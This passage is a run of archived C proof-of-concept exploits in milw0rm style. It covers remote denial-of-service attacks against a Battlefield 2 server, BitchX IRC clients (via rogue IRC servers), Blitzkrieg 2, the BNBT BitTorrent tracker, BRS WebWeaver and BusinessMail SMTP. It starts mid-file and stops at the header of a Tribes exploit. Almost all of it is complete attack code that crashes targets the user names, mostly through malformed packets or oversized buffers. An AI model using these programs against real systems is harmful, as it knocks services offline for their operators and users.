            case 'p': port  = atoi(argv[++i]);      break;
            case 'v': ver   = setver(argv[++i]);    break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n", argv[i]);
                exit(1);
                } break;
        }
    }

    host = argv[argc];
    p = strchr(host, ':');
    if(p) {
        *p = 0;
        port = atoi(p + 1);
    }

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();
    pass[0] = 0;
    strcpy(mod, "mods/bf2");

    if(!ver) {
        printf("- query server\n");
        ver = bf2_info(buff, &peer);
        if(!ver) {
            printf("\nError: no version/gamever found in the server's reply\n");
            exit(1);
        }
        printf("\n- set version %08x\n", ver);
    }

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    bug = time(NULL) & 0x1f;
    if(!bug) bug++; // between 1 and 0x1f
    b   = 0;
    len = -1;
    for(;;) {
        res = -1;   // reset
        if(len >= 0) {
            len = send_recv(sd, buff, len, buff, BUFFSZ, &peer, 0);
            if(len < 0) {
                if(par1 == 1) {
                    par1 = 0x10;
                    par2 = 0xf005;
                    continue;
                }
                printf("\nError: no reply received from server\n");
                exit(1);
            }
            b = 0;
            res = read_bits(4,  buff, b);   b += 4;
            printf("\n  received: %02x %d\n", res, len);
            len = -1;   // reset
        }

        if(res < 0) {
            b = 0;
            b = write_bits(1,       4,  buff, b);
            b = write_bits(par1,    8,  buff, b);
            b = write_bits(par2,    32, buff, b);
            b = write_bits(ver,     32, buff, b);
            b = write_bits(1,       1,  buff, b);
            b = write_bits(0,       32, buff, b);
            b = write_bstr(pass,    32, buff, b);
            b = write_bstr(mod,     32, buff, b);
            len = PADDING(b) >> 3;

        } else if(res == 2) {
            slot = read_bits(8, buff, 12);
            b = 0;
            b = write_bits(0x04,    4,  buff, b);
            b = write_bits(slot,    8,  buff, b);
            len = PADDING(b) >> 3;

        } else if(res == 0x0f) {
            b = 0;
            b = write_bits(0x0f, 4, buff, b);
            b = write_bits(slot, 8, buff, b);
            b = write_bits(bug, 6, buff, b);
            b = write_bits(0x00, 6, buff, b);
            b = write_bits(0x00, 32, buff, b);
            len = PADDING(b) >> 3;

        } else if(res == 0x07) {
            token = read_bits(32, buff, 57);
            b = 0;
            b = write_bits(0x08, 4, buff, b);
            b = write_bits(slot, 8, buff, b);
            b = write_bits(0x3f, 6, buff, b);
            b = write_bits(0x00, 6, buff, b);
            b = write_bits(0x00, 32, buff, b);
            b = write_bits(0x00, 1, buff, b);
            b = write_bits(token, 32, buff, b);
            b = write_bits(0, 32, buff, b);
            len = PADDING(b) >> 3;

        } else if(!res || (res == 3)) {
                                            b += 8;
            err = read_bits(32, buff, b);   b += 32;

            if(err == 2) {
                printf("\n- server full\n");
                sleep(ONESEC);
                continue;
            } else if(err == 0x11) {
                printf("\n- server is protected, insert password:\n  ");
                fgetz(pass, sizeof(pass));
                continue;
            } else if(err == 0x17) {
                printf("\nError: your version is minor than that of the server\n");
                exit(1);
            } else if(err == 0x18) {
                if(len < 0) goto quit;  // lame work-around
                printf("\nError: your version is major than that of the server\n");
                exit(1);
            } else if(err == 0x24) {
                read_bstr(mod, 32, buff, b + 1);
                printf("\n- set mod: %.*s\n", 32, mod);
                continue;
            } else {
                if(!res) {  // demo
                    continue;
                }
                printf("\nError: your player has not been accepted, error %08x\n", err);
                exit(1);
            }
        } else {
            printf("\nError: your player has not been accepted, result %08x\n", res);
            exit(1);
        }
    }

quit:
    close(sd);
    printf("\n"
        "- you must check the server manually or relaunching this PoC to know if it's\n"
        "  vulnerable or not\n");
    return(0);
}



u32 setver(u8 *gamever) {
    int     v1  = 0,
            v2  = 0,
            v3  = 0,
            v4  = 0;

    sscanf(gamever, "%d.%d.%d.%d", &v1, &v2, &v3, &v4);
    return(((v1 & 0xf) << 28) | ((v2 & 0xf) << 24) | ((v3 & 0xffff) << 8) | (v4 & 0xff));
}



int write_bstr(u8 *data, u32 len, u8 *buff, u32 bitslen) {
    int     i;

    for(i = 0; i < len; i++) {
        if(!data[i]) break;
        bitslen = write_bits(data[i], 8,  buff, bitslen);
    }
    for(     ; i < len; i++) {
        bitslen = write_bits(0,       8,  buff, bitslen);
    }
    return(bitslen);
}



int read_bstr(u8 *data, u32 len, u8 *buff, u32 bitslen) {
    int     i;

    for(i = 0; i < len; i++) {
        data[i] = read_bits(8, buff, bitslen);
        bitslen += 8;
    }
    return(bitslen);
}



u32 bf2_info(u8 *buff, struct sockaddr_in *peer) {
    u32     ver = 0,
            chall;
    u16     bckport;
    int     sd,
            i,
            len;
    u8      gs3[32],
            *gamever,
            *hostport;

    bckport = ntohs(peer->sin_port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    for(i = 0; i < 2; i++) {
        switch(i) {
            case 0: peer->sin_port = htons(29900);      break;
            case 1: peer->sin_port = htons(bckport);    break;
        }
        printf("\n- send query to port %hu\n", ntohs(peer->sin_port));
        len = send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, buff, BUFFSZ, peer, 0);
        if(len > 0) break;
        len = send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, buff, BUFFSZ, peer, 0);
        if(len > 0) {
            memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
            chall = atoi(buff + 5);
            gs3[7]  = chall >> 24;
            gs3[8]  = chall >> 16;
            gs3[9]  = chall >>  8;
            gs3[10] = chall;
            len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, BUFFSZ, peer, 0);
            if(len > 0) break;
        }
    }
    if(len < 0) goto quit;

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len, 0, '\0', 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        ver = setver(gamever);
    }
    if(hostport) {
        bckport = atoi(hostport);
    }

quit:
    close(sd);
    peer->sin_port = htons(bckport);
    return(ver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



void fgetz(u8 *data, int len) {
    u8      *p;

    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) goto quit;
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/6880/info

It has been reported that BitchX does not properly handle some types of replies contained in the RPL_NAMREPLY numeric. When a malformed reply is received by the client, the client crashes, resulting in a denial of service. 

/*
 * bitchx-353.c
 * --argv
 * Jan/30/03
 *
 * Vulnerable:
 *      BitchX-75p3
 *      BitchX-1.0c16
 *      BitchX-1.0c19
 *      BitchX-1.0c20cvs
 *
 * Not Vulnerable:
 *      BitchX-1.0c18   (So far..)
 *
 *
 *  Workaround:
 *      in function funny_namreply()
 *      after the PasteArgs(Args, 2);
 *      add in
 *      -- snip --
 *      if (Args[1] == NULL || Args[2] == NULL)
 *                      return;
 *      -- unsnip --
 *
 * ---- the vuln code of bx -----
 *       PasteArgs(Args, 2);
 *       type = Args[0];
 *       channel = Args[1];
 *       line = Args[2];
 *
 *       ptr = line;
 *       while (*ptr)
 *       {
 *               while (*ptr && (*ptr != ' '))
 *                       ptr++;
 *               user_count++;
 *               while (*ptr && (*ptr == ' '))
 *                       ptr++;
 *       }
 * ------------------------------
 *
 * [panasync(panasync@colossus.melnibone.org)] you would hope the irc server would be a trusted source.
 * [hellman(hellman@ipv6.gi-1.au.reroute.se)] 'Free porn at /server irc.owned.com'
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

static char shellcode[] = ":* 353 * =  :\n";    // <-- this could be something worse.

int acceptConnection(int fd)
{
   char *ip_addr;
   int descriptor, sal;
   struct sockaddr_in sa;
   sal = sizeof(sa);
   descriptor = accept(fd, (struct sockaddr *) &sa, &sal);
   if (descriptor >= 0) {
      ip_addr = inet_ntoa(sa.sin_addr);
      printf("Connection from %s:%d\n", ip_addr, ntohs(sa.sin_port));
   }
   return descriptor;
}


int main(int argc, char **argv)
{
   int sock, serv, port;
   struct sockaddr_in server;

   port = 6667;

   if (argc > 1)
        port = atoi(argv[1]);

   memset(&server, 0, sizeof(server));
   server.sin_port = htons(port);
   server.sin_family = AF_INET;
   server.sin_addr.s_addr = INADDR_ANY;

   sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
   setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &serv, sizeof(int));

   if (bind(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in))
       == -1) {
      return 0;
   }

   listen(sock, 1);

   while (1) {
      serv = acceptConnection(sock);
      write(serv, shellcode, strlen(shellcode));
      close(serv);
   }
   return 0;
}
// BitchX (epic) =<1.1-final | do_hook() Boundary Check Error Remote DoS
/////////////////////////////////////////////////////////////////////////
// Federico L. Bossi Bonin
// fbossi<at>netcomm<dot>com<dot>ar


// #0  0x080a3fcc in BX_do_hook (which=9999999, format=0x8119077 "%s %s") at hook.c:865
// #1  0x080d013b in numbered_command (from=0xbfbfe031 'A' <repeats 200 times>, 
// comm=-9999999, ArgList=0xbfbfd788) at numbers.c:1413
// #2  0x080d7d02 in parse_server (orig_line=0xbfbfe030 ":", 'A' <repeats 199 times>...) at parse.c:1912
// #3  0x080de3c2 in do_server (rd=0xbfbfe8a0, wr=0xbfbfe880) at server.c:584
// #4  0x080b030f in BX_io (what=0x810b85a "main") at irc.c:1319
// #5  0x080b09da in main (argc=6, argv=0xbfbfe9d4, envp=0xbfbfe9f0) at irc.c:1687
// #6  0x0804aec2 in ___start ()

//greats to nitr0us, beck, gruba, samelat, ran, etc..

#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 6667
#define LEN 100

int intalign=-999; //use negative number

void sendbuff(int sock) {
char ptr[LEN];
char buffer[2048];
bzero(ptr,LEN);
bzero(buffer,2048);
memset(ptr,0x41,sizeof(ptr)-1);
sprintf(buffer,":%s %i %s %s\n",ptr,intalign,ptr,ptr);
write(sock,buffer,sizeof(buffer));
}

int main() {
struct sockaddr_in srv_addr, client;
int len,pid,sockfd,sock;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

if (sockfd < 0) { 
perror("error socket()"); 
exit(1);
}
     
bzero((char *) &srv_addr, sizeof(srv_addr));
srv_addr.sin_family = AF_INET;
srv_addr.sin_addr.s_addr = INADDR_ANY;
srv_addr.sin_port = htons(PORT);

if (bind(sockfd, (struct sockaddr *) &srv_addr,sizeof(srv_addr)) < 0)  {
perror("error bind()");
exit(1);
}


printf("BitchX (epic) =<1.1-final | do_hook() Boundary Check Error Remote DoS\n");
printf("====================================================================\n");
printf("Listening on port %i\n",PORT);

listen(sockfd,5);
len = sizeof(client);

while (1) {
sock = accept(sockfd, (struct sockaddr *) &client, &len);
if (sock < 0)  {
perror("error accept()");
exit(1);
}

pid = fork();
if (pid < 0)  {
perror("fork()");
exit(1);
}
if (pid == 0)  {
close(sockfd);
printf("Conection from %s\n",inet_ntoa(client.sin_addr));
sendbuff(sock);
exit(0);
}
else close(sock);
} 
return 0;
}

// milw0rm.com [2006-06-24]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// inserted winerr.h /str0ke

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define B2OUT   "\x09\x00\x00\x00\x00"



u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Blitzkrieg 2 <= 1.21 players kicker "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <host> <port>\n"
            "\n"
            "Note: port is usually 4201 for LAN and 1028 for Internet\n"
            "Note: this tool works versus both server (better) and clients, but naturally\n"
            "      you need to know their IP addresses of these last to kick them directly\n"
            "\n", argv[0]);
        exit(1);
    }

    port                  = atoi(argv[2]);
    peer.sin_addr.s_addr  = resolv(argv[1]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    if(sendto(sd, B2OUT, sizeof(B2OUT) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    close(sd);

    fputs("\nServer should be no longer available, check it manually\n\n", stdout);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-11-02]
/* BNBT BitTorrent EasyTracker Remote Denial Of Service
   
   Versions:
   Version 7.7r3.2004.10.27 and below
  
   Vendors:
   http://bnbt.go-dedicated.com/
   http://bnbteasytracker.sourceforge.net/
   http://sourceforge.net/projects/bnbtusermods/

   Bug find and coded by:
   Sowhat@@secway@org
   http://secway.org

   This PoC will Crash the server.
 */

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char exploit[] = 

"GET /index.htm HTTP/1.0\r\n:\r\n\r\n";

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent  *pTarget;
	struct sockaddr_in 	sock;
	char *target;
	int port,bufsize;
	SOCKET mysocket;
	
	if (argc < 2)
	{
		printf(" ######################################################################\r\n");
		printf(" #   BNBT BitTorrent EasyTracker DoS by sowhat <sowhat@@secway@org>   #\r\n", argv[0]);
		printf(" #          This exploit will Crash the Server                        #\r\n");
		printf(" #               http://www.secway.org                                #\r\n");		
		printf(" ######################################################################\r\n");
		printf(" Usage:\r\n %s <targetip> [targetport] (default is 6969)	\r\n", argv[0]);
		printf(" Example:\r\n");
		printf("	%s 1.1.1.1\r\n",argv[0]);
		printf("	%s 1.1.1.1 8888\r\n",argv[0]);
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	target = argv[1];
	port = 6969;

	if (argc >= 3) port = atoi(argv[2]);
	bufsize = 1024;
	if (argc >= 4) bufsize = atoi(argv[3]);

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket==INVALID_SOCKET)
	{	
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("Resolving Hostnames...\n");
	if ((pTarget = gethostbyname(target)) == NULL)
	{
		printf("Resolve of %s failed\n", argv[1]);
		exit(1);
	}

	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf("Connecting...\n");
	if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf("Couldn't connect to host.\n");
		exit(1);
	}

	printf("Connected!...\n");
	printf("Sending Payload...\n");
	if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
	{
		printf("Error Sending the Exploit Payload\r\n");
		closesocket(mysocket);
		exit(1);
	}

	printf("Payload has been sent! Check if the webserver is dead.\r\n");
	closesocket(mysocket);
	WSACleanup();
	return 0;
}

// milw0rm.com [2005-09-06]
source: http://www.securityfocus.com/bid/8947/info

It has been reported that BRS WebWeaver may be prone to a denial of service issue that may allow a remote attacker to cause the software to crash or hang. The issue presents itself when the server receives a request containing a large string value for the `User-Agent` parameter. 

Successful exploitation of this issue may allow an attacker to cause the software to crash or hang.

BRS WebWeaver versions 1.06 and prior have been reported to be prone to this issue.

/*
 *  BRS WebWeaver v.1.06 remote DoS exploit
 *
 * -d4rkgr3y [d4rk@securitylab.ru]
 *
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>

#define port 80

main(int argc, char **argv) {
        struct hostent *hs;
        struct sockaddr_in sock;
        int sockfd, i;
        const c = 50000;
        char request[50150] =
                "GET /m00-r0cz HTTP/1.0\n"
                "Accept: */*\n"
                "Accept-Language: jp\n"
                "Accept-Encoding: gzip, deflate\n"
                "Host: m00security.org\n"
                "User-Agent: ";
        printf("BRS WebWeaver v.1.06 remote DoS exploit\n\n");

        if (argc!=2){
                printf("usage\n %s hostname\n\n",argv[0]);
                exit(1);
        }

        //memset((request+98),0x41,c);
        memset((request+strlen(request)),0x41,c);
        /* l33t ;] */
        request[strlen(request)] = 0x0a;
        request[strlen(request)] = 0x43;
        request[strlen(request)] = 0x6f;
        request[strlen(request)] = 0x6e;
        request[strlen(request)] = 0x6e;
        request[strlen(request)] = 0x65;
        request[strlen(request)] = 0x63;
        request[strlen(request)] = 0x74;
        request[strlen(request)] = 0x69;
        request[strlen(request)] = 0x6f;
        request[strlen(request)] = 0x6e;
        request[strlen(request)] = 0x3a;
        request[strlen(request)] = 0x20;
        request[strlen(request)] = 0x4b;
        request[strlen(request)] = 0x65;
        request[strlen(request)] = 0x65;
request[strlen(request)] = 0x70;
        request[strlen(request)] = 0x2d;
        request[strlen(request)] = 0x41;
        request[strlen(request)] = 0x6c;
        request[strlen(request)] = 0x69;
        request[strlen(request)] = 0x76;
        request[strlen(request)] = 0x65;
        request[strlen(request)] = 0x0a;
        request[strlen(request)] = 0x0a;

        bzero(&sock, sizeof(sock));
        sock.sin_family = AF_INET;
        sock.sin_port = htons(port);
        if ((sock.sin_addr.s_addr=inet_addr(argv[1]))==-1) {
                if ((hs=gethostbyname(argv[1]))==NULL) {
                        printf("damn");
                        exit(1);
                }
                printf("~ Host resolved.\n");
                sock.sin_family = hs->h_addrtype;
                
memcpy((caddr_t)&sock.sin_addr.s_addr,hs->h_addr,hs->h_length);
        }
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                perror("damn");  exit(0);
        }

        if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0){
                perror("damn"); exit(0);
        }
        printf("~ Socket connected\n");
        printf("~ Sending evil code... ");
        write(sockfd,request,strlen(request));
        printf("done\n\n");
        close(sockfd);
}
/*****************************************************************

BusinessMail Server Remote Denial of Service Exploit by Kozan
( Based on Reed Arvin's code in perl )

Application: BusinessMail Server 4.60.00
Vendor: www.netcplus.com

Discovered by:  Reed Arvin
Exploit Coded by: Kozan
Credits to ATmaCA,  Reed Arvin
Web: www.spyinstructors.com
Mail: kozan@spyinstructors.com

*****************************************************************/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")

char Buff[] =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char *argv[])
{
       fprintf(stdout, "BusinessMail Server Remote Denial of Service Exploit by Kozan\n");
       fprintf(stdout, "Discovered by: Reed Arvin\n");
       fprintf(stdout, "Exploit Coded by: Kozan\n");
       fprintf(stdout, "Credits to ATmaCA, Reed Arvin\n\n");
       fprintf(stdout, "www.spyinstructors.com - kozan@spyinstructors.com\n");

       if(argc<2)
       {
               fprintf(stderr, "\n\nUsage: %s [Target IP]\n\n", argv[0]);
               return -1;
       }
       WSADATA wsaData;
       SOCKET sock;

       if( WSAStartup(0x0101,&wsaData) < 0 )
       {
               fprintf(stderr, "Winsock error!\n");
               return -1;
       }

       sock = socket(AF_INET,SOCK_STREAM,0);
       if( sock == -1 )
       {
               fprintf(stderr, "Socket error!\n");
               return -1;
       }

       struct sockaddr_in addr;

       addr.sin_family = AF_INET;
       addr.sin_port = htons(25);
       addr.sin_addr.s_addr = inet_addr(argv[1]);
       memset(&(addr.sin_zero), '\0', 8);

       fprintf(stdout, "Connecting to %s ...\n", argv[1]);

       if( connect( sock, (struct sockaddr*)&addr, sizeof(struct sockaddr) ) == -1 )
       {
               fprintf(stderr, "Connection failed!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Connected.\n");

       char szBuf1[1024], szBuf2[1024];

       wsprintf(szBuf1, "HELO %s\r\n", Buff);
       wsprintf(szBuf2, "MAIL FROM:%s\r\n", Buff);

       fprintf(stdout, "Sending HELO ...\n");

       if( send(sock,szBuf1,strlen(szBuf1),0) == -1 )
       {
               fprintf(stderr, "HELO string could not sent!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Sending MAIL FROM ...\n");

       if( send(sock,szBuf2,strlen(szBuf2),0) == -1 )
       {
               fprintf(stderr, "MAIL FROM string could not sent!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Operation completed...\n");
       closesocket(sock);
       WSACleanup();

       return 0;
}

// milw0rm.com [2005-08-01]
/*
Program: byebye_tribes.c
Original Date: June 10th, 2003
Version: 1.0
Platform: Windows (all)
c0der: st0ic
site: www.fsix.net
e-mail: st0icATfsixDOTnet

***Vulnerability Discovered by JadaCyruS <jadacyrusATfsixDOTnet>

Revised:
	NONE thus far

Description: 
